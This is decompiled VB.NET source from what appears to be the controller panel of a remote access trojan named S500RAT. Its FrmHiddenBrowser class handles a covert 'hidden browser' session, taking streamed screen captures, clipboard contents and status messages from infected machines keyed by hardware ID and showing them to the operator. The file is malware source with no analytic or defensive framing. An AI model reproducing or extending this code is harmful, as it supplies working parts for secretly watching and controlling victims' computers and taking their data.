Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200004A RID: 74
	Public Class FrmHiddenBrowser
		' Token: 0x06001189 RID: 4489 RVA: 0x00097FF0 File Offset: 0x000961F0
		Public Sub Capture(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(asString)
				If num <= 1703884388UI Then
					If num <> 182978943UI Then
						If num <> 1266644741UI Then
							If num = 1703884388UI Then
								If Operators.CompareString(asString, "Copy", False) = 0 Then
									Dim formHBrowser As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
									Dim flag As Boolean = formHBrowser IsNot Nothing
									If flag Then
										formHBrowser.StateHApp.ForeColor = Color.Aqua
										formHBrowser.StateHApp.Text = "Clipboard : " + unpack_msgpack.ForcePathObject("Text").AsString
									End If
								End If
							End If
						ElseIf Operators.CompareString(asString, "Stop", False) = 0 Then
							Dim formHBrowser2 As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
							Dim flag2 As Boolean = formHBrowser2 IsNot Nothing
							If flag2 Then
								formHBrowser2.ComboBox1.[ReadOnly] = False
								formHBrowser2.PLW.Animated = False
								formHBrowser2.PLW.Value = 0
								formHBrowser2.StartAndStop.Enabled = True
								formHBrowser2.StartAndStop.Text = "Start"
								formHBrowser2.StartAndStop.FillColor = Color.FromArgb(26, 155, 161)
								formHBrowser2.StartAndStop.FillColor2 = Color.FromArgb(26, 155, 161)
								formHBrowser2.FPS.Text = Conversions.ToString(0)
								formHBrowser2.FPS.ForeColor = Color.White
								formHBrowser2.QualityUsing.Enabled = True
							End If
						End If
					ElseIf Operators.CompareString(asString, "Start", False) = 0 Then
						Dim formHBrowser3 As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
						Dim flag3 As Boolean = formHBrowser3 IsNot Nothing
						If flag3 Then
							formHBrowser3.StartAndStop.Enabled = True
							formHBrowser3.StartAndStop.Text = "Stop"
							formHBrowser3.StartAndStop.FillColor = Color.FromArgb(211, 57, 87)
							formHBrowser3.StartAndStop.FillColor2 = Color.FromArgb(211, 57, 87)
							formHBrowser3.QualityUsing.Enabled = False
							formHBrowser3.ComboBox1.[ReadOnly] = True
							formHBrowser3.PLW.Animated = True
							formHBrowser3.PLW.Value = 50
						End If
					End If
				ElseIf num <= 2614674993UI Then
					If num <> 2082903604UI Then
						If num = 2614674993UI Then
							If Operators.CompareString(asString, "Screen", False) = 0 Then
								Dim formHBrowser4 As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
								Try
									Dim flag4 As Boolean = formHBrowser4 IsNot Nothing
									If flag4 Then
										Dim asBytes As Byte() = unpack_msgpack.ForcePathObject("Stream").GetAsBytes()
										Dim syncPicbox As Object = formHBrowser4.syncPicbox
										ObjectFlowControl.CheckForSyncLockOnValueType(syncPicbox)
										SyncLock syncPicbox
											Using memoryStream As MemoryStream = New MemoryStream(asBytes)
												Dim bitmap As Bitmap = formHBrowser4.decoder.DecodeData(memoryStream)
												formHBrowser4.GetImage = bitmap
												formHBrowser4.rdSize = bitmap.Size
											End Using
											formHBrowser4.PictureBox1.Image = formHBrowser4.GetImage
											Dim formHBrowser5 As FormHBrowser = formHBrowser4
											Dim ptr As Integer = formHBrowser5.IntFPS
											formHBrowser5.IntFPS = ptr + 1
											Dim flag6 As Boolean = formHBrowser4.sw.ElapsedMilliseconds >= 1000L
											If flag6 Then
												formHBrowser4.FPS.Text = Conversions.ToString(formHBrowser4.IntFPS)
												formHBrowser4.rdSize = formHBrowser4.GetImage.Size
												formHBrowser4.IntFPS = 0
												formHBrowser4.sw = Stopwatch.StartNew()
												Dim flag7 As Boolean = formHBrowser4.IntFPS < 4
												If flag7 Then
													formHBrowser4.FPS.ForeColor = Color.Orange
												Else
													Dim flag8 As Boolean = formHBrowser4.IntFPS > 4
													If flag8 Then
														formHBrowser4.FPS.ForeColor = Color.Green
													Else
														formHBrowser4.FPS.ForeColor = Color.GreenYellow
													End If
												End If
												formHBrowser4.SizeImage.Text = Functions.BytesToSize(CLng(asBytes.Length))
											End If
										End SyncLock
									End If
								Catch ex As Exception
									Debug.WriteLine(ex.Message)
								End Try
							End If
						End If
					ElseIf Operators.CompareString(asString, "setClient", False) = 0 Then
						Dim formHBrowser6 As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
						Dim flag9 As Boolean = formHBrowser6 IsNot Nothing
						If flag9 Then
							Dim flag10 As Boolean = formHBrowser6.Client Is Nothing
							If flag10 Then
								client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString
								formHBrowser6.Client = client
								formHBrowser6.Timer1.Enabled = True
								formHBrowser6.StartAndStop.Enabled = True
								formHBrowser6.QualityUsing.Enabled = True
							End If
						End If
					End If
				ElseIf num <> 3546021741UI Then
					If num = 4086144241UI Then
						If Operators.CompareString(asString, "Error", False) = 0 Then
							Dim formHBrowser7 As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
							Dim flag11 As Boolean = formHBrowser7 IsNot Nothing
							If flag11 Then
								formHBrowser7.StateHApp.ForeColor = Color.Red
								formHBrowser7.StateHApp.Text = "Error : " + unpack_msgpack.ForcePathObject("Error").AsString
							End If
						End If
					End If
				ElseIf Operators.CompareString(asString, "HBrowserInfo", False) = 0 Then
					Dim formHBrowser8 As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
					Dim flag12 As Boolean = formHBrowser8 IsNot Nothing
					If flag12 Then
						formHBrowser8.StateHApp.ForeColor = Color.White
						formHBrowser8.StateHApp.Text = unpack_msgpack.ForcePathObject("HAppInfo").AsString
					End If
				End If
			Catch ex2 As Exception
				ListLogs.AddArray("Hidden Browser " + client.IP + " Error : " + ex2.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
